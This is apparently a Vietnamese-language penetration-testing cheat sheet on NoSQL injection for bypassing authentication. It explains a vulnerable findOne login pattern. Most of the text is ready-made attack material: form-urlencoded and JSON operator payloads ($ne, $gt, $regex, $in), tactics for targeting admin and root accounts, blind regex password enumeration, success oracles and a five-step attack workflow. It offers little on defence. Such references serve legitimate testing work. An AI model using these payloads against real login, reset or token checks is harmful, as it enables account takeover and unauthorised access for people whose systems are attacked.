# Authentication Bypass Trong NoSQL

## Tong quan

Tac dong thuong gap nhat cua NoSQLi la `authentication bypass`.

Pattern de bi loi:

```js
const user = await db.users.findOne({
  username: req.body.username,
  password: req.body.password
});
if (user) issueSession(user);
```

Neu attacker control duoc selector logic, login khong con nghia la "password dung", ma la "co mot document bat ky match payload".

## Tai sao bypass duoc

- `username` va `password` deu den tu client
- `findOne()` tra ve document dau tien match
- app thuong xem "co ket qua" la da auth thanh cong

Vi du:

```json
{"password":{"$ne":"invalid"}}
```

Gia tri nay co the match nhieu account, tuy data that.

## Payload pho bien

### Form-urlencoded

```text
username[$ne]=x&password[$ne]=x
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
username[$eq]=admin&password[$ne]=x
username[$in][]=admin&username[$in][]=administrator&password[$gt]=
```

### JSON

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$ne":"foo"},"password":{"$ne":"bar"}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$eq":"admin"},"password":{"$regex":"^a"}}
{"username":{"$in":["admin","administrator","root"]},"password":{"$gt":""}}
```

## Chien luoc tan cong

### 1. Broad bypass de confirm vuln

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Nhanh de proof, nhung co the vao sai user.

### 2. Target bypass vao account gia tri cao

```json
{"username":{"$eq":"admin"},"password":{"$ne":""}}
```

hoac:

```json
{"username":{"$in":["admin","administrator","root"]},"password":{"$gt":""}}
```

### 3. Blind enum password qua regex

```json
{"username":{"$eq":"admin"},"password":{"$regex":"^a"}}
{"username":{"$eq":"admin"},"password":{"$regex":"^ad"}}
```

## Oracle thuong dung

| Oracle | Y nghia |
|--------|---------|
| redirect `/dashboard` | login thanh cong |
| session cookie moi | auth flow da qua |
| message "invalid" doi | true/false signal |
| content-length doi | boolean oracle |
| lockout khong trigger | query path dang bypass auth logic |

## Vuot ngoai form dang nhap

Cung pattern nay co the xay ra o:

- password reset check
- token validation
- role/tenant filter
- API "get current user" co selector nguy hiem

Vi du:

```js
db.users.findOne({ resetToken: req.body.token, email: req.body.email })
db.sessions.findOne({ userId: req.body.userId, active: true })
```

## Luu y khi dien giai ket qua

Bypass auth **khong dong nghia** password plaintext.

Nghia dung la:

- auth logic dang phu thuoc vao selector do client shape
- server khong giu quyen so huu query grammar

## Workflow ngan gon

1. Tim request login/session.
2. Thu object payload tren `username` va `password`.
3. Confirm bypass bang broad operator (`$ne`, `$gt`, `$exists`).
4. Refine payload de target dung account.
5. Neu can, chuyen regex blind extraction.
